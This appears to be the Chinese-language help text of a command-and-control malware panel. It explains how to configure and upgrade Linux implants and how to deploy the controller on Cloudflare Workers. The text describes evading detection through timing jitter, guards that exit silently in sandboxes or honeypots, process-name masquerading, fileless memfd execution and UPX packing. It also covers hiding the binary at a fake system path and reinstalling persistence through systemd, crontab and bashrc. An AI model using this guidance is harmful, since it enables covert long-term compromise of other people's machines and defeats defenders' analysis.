Time Window：空=全天活跃 · 09:00-18:00=时间段（跨夜写 22:00-06:00）· 9,10,11,14=指定小时列表。边界自动 ±20min 随机抖动（防定时指纹）。窗外面板显示"安静"（非掉线）。
Poll Interval：轮询间隔。30=标准 · 10=最快 · ≥60=省流量。Agent 内置三档自适应（有命令降频、闲置升频）。
通信 Secret：控制端↔Agent 的 AES-GCM 加密口令。部署时设过就留空（沿用），仅覆盖时填新值。改了=旧 Agent 全部失联。
Backup URL：GitHub Token 被撤销（401）时，Agent 从此地址拉新配置（HMAC 签名防篡改）。留空=禁用。
架构：musl=静态链接无 glibc（推荐，兼容 Alpine）· gnu=动态链接（体积小但目标机需 glibc）。
Release：自定义版本标签（面板 Agent 详情显示）。空=自动取构建时的 git 短号。
Guards（折叠区）：四条激活守卫，全留空=不限制。设了任何一条，不满足时 Agent 静默退出——用于限定只在目标环境运行，防蜜罐/沙箱执行。
Guards & 伪装定制（可选 OPSEC）
进程名 ≤15 字符（内核 comm 截断）。无文件（memfd）模式下仅进程名生效（无落地文件）。 自定义路径若指向运行中的二进制或不可写，构建的 Agent 会自动回退自动模式（不会破坏启动）。
strip: removes debug symbols (~30% smaller, always safe). UPX: packs binary (~60% smaller, requires upx installed).

📖 使用说明
升级流程：
1. 在左侧选择要升级的 agent
2. 在 Builder 标签编译好新版二进制，复制下载链接
3. 将链接粘贴到下方 新二进制 URL 输入框
4. 点击 Download & Upgrade：agent 会 wget/curl 下载文件并自动替换自身
5. Agent 完成替换后重启，约 30-60s 后在控制端重新上线

升级做了什么：
• Kill 旧版进程，将新二进制复制到隐藏路径（/usr/lib/systemd/polkitd 等）
• 卸载旧版持久化（systemd/crontab/bashrc），重新安装新版
• 自动迁移旧版数据（issue ID / agent_id），保持同一 agent 身份
• 清理所有用户的旧 bashrc hook（防止 SSH 登录报错）

注意事项：
• 仅支持 Linux；Windows agent 升级请手动操作
• 新二进制必须与 agent 的加密密码一致，否则无法通信
• 升级完成后旧进程退出，controller 约 60s 后重新收到 agent 心跳
• 若升级失败（文件损坏/权限不足），旧实例继续运行不受影响

            📖 如何创建 Cloudflare API Token（点击展开）
            

              1. 打开 https://dash.cloudflare.com/profile/api-tokens → Create Token

              2. 选 Create Custom Token，名称随意（如 c2-deploy），权限按下面 3 条 配置：

              Account · Workers Scripts · Edit
              Account · D1 · Edit
              Account · Workers Subdomain · Read

              3. Account Resources 选 Include → 你的账户；点 Continue to summary → Create Token

              4. 复制生成的 Token（只显示一次）粘贴到上面输入框。

              提示：若 Token 没给账户读取权限导致自动定位失败，把 dash 右侧栏的
              Account ID 填到"账户 ID"框即可。部署完成后 Token 保存在控制器数据库（GET 接口只回掩码），
              不需要时可去 CF 面板删除该 Token。
